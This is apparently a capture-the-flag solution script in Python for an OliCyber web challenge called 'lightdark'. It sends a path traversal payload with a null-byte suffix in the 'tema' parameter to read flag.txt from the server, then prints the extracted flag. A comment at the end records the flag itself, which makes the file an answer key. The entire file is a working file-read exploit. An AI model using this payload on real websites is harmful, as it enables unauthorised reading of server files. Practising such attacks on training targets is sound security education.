import requests
import re

site = "http://lightdark.challs.olicyber.it/"

r = requests.get(f"{site}/index.php?tema=.../.../.../.../.../flag.txt%00.css").text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{l1ght_1s_f0r_n00bs_d4rk_1s_f0r_h4ck3rs}
